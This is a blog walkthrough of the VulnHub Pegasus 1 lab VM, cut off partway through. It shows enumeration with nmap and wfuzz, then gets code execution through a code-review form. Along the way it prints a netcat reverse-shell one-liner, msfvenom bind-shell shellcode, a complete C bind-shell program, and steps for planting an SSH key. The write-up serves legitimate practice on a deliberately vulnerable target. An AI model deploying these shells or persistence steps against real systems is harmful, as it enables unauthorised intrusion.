
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>hoof to root ? - solving pegasus 1 - #!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="introduction Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">hoof to root ? - solving pegasus 1</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-12-23T08:29:49+02:00" pubdate data-updated="true">Dec 23<sup>rd</sup>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>introduction</h2>

<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>

<p><img class="right" src="https://i.imgur.com/PI4O7Dp.png"> Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>

<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>

<p>Lets begin.</p>

<!-- more -->


<h2>nmap, again</h2>

<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap --reason -sV 192.168.56.101 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-23 09:16 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.101
</span><span class='line'>Host is up, received arp-response <span class="o">(</span>0.00022s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65531 closed ports
</span><span class='line'>Reason: 65531 resets
</span><span class='line'>PORT      STATE SERVICE REASON  VERSION
</span><span class='line'>22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>111/tcp   open  rpcbind syn-ack 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'>8088/tcp  open  http    syn-ack nginx 1.1.19
</span><span class='line'>55625/tcp open  status  syn-ack 1 <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 08:00:27:88:F8:40 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 16.37 seconds
</span></code></pre></td></tr></table></div></figure>


<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>

<h2>stomping some hoofs with pegasus</h2>

<p>Browsing to <a href="http://192.168.56.101:8088/,">http://192.168.56.101:8088/,</a> we are presented with a picture of Pegasus:</p>

<p><img src="https://i.imgur.com/Z0XYRY8.jpg"></p>

<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>

<p><img src="https://i.imgur.com/svwUN3m.png"></p>

<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.101:8088/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">1660</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>01426:  <span class="nv">C</span><span class="o">=</span>200      0 L         4 W       19 Ch    <span class="s2">&quot; - submit&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>

<p><img src="https://i.imgur.com/Ld1KzkR.png"></p>

<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>

<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>

<p><img src="https://i.imgur.com/wYpHVWE.png"></p>

<h2>pwning mike</h2>

<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>

<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>

<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>

<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>

<p><img src="https://i.imgur.com/IVmBaAA.png"></p>

<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>

<p><em>insert fade to black</em></p>

<p><em>CAPTION: many hours later</em></p>

<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">ret</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za</span>
</span><span class='line'><span class="c1">// http://bigpointyteeth.se/code/bindshell.c</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define SHELL &quot;/bin/sh&quot;   </span><span class="c1">// shell to execute</span>
</span><span class='line'><span class="cp">#define NAME &quot;rsync&quot;        </span><span class="c1">// name of the forked bindshell shown in ps</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">srv_sockfd</span><span class="p">,</span> <span class="n">new_sockfd</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">socklen_t</span> <span class="n">new_addrlen</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">srv_addr</span><span class="p">,</span> <span class="n">new_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// fork into background</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">srv_sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">PF_INET</span><span class="p">;</span>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="s">&quot;4444&quot;</span><span class="p">));</span>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">srv_sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">srv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">srv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">srv_sockfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// accept loop</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">new_addrlen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">new_addr</span><span class="p">);</span>
</span><span class='line'>            <span class="n">new_sockfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">srv_sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">new_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_addrlen</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">new_sockfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// fork to handle new connection</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">// close old listener</span>
</span><span class='line'>                <span class="n">close</span><span class="p">(</span><span class="n">srv_sockfd</span><span class="p">);</span>
</span><span class='line'>                <span class="c1">// print the parent pid which should be killed in order</span>
</span><span class='line'>                <span class="c1">// to remove the persistant bindshell listener</span>
</span><span class='line'>                <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">&quot;ppid=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>                <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>                <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">execl</span><span class="p">(</span><span class="n">SHELL</span><span class="p">,</span> <span class="n">NAME</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="k">else</span>
</span><span class='line'>                <span class="n">close</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span> <span class="c1">// end accept loop</span>
</span><span class='line'>    <span class="p">}</span> <span class="c1">// end fork into background</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.101 -p 4444
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-23 11:33 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.101
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'>MAC Address: 08:00:27:88:F8:40 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 0.17 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Awesome, so lets connect and see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -v 192.168.56.101 4444
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.101<span class="o">]</span> 4444 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="nv">ppid</span><span class="o">=</span>10450
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first I cat the public key so that I can copy it</span>
</span><span class='line'>root@kali:~# cat pegasus.pub
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali
</span><span class='line'>
</span><span class='line'><span class="c"># next I connect to the bind shell listener and move to Mikes .shh directory</span>
</span><span class='line'>root@kali:~# nc -v 192.168.56.101 4444
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.101<span class="o">]</span> 4444 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="nv">ppid</span><span class="o">=</span>10450
</span><span class='line'><span class="nb">cd</span> .ssh
</span><span class='line'>
</span><span class='line'><span class="c"># next we append my public key to mikes authorized_keys</span>
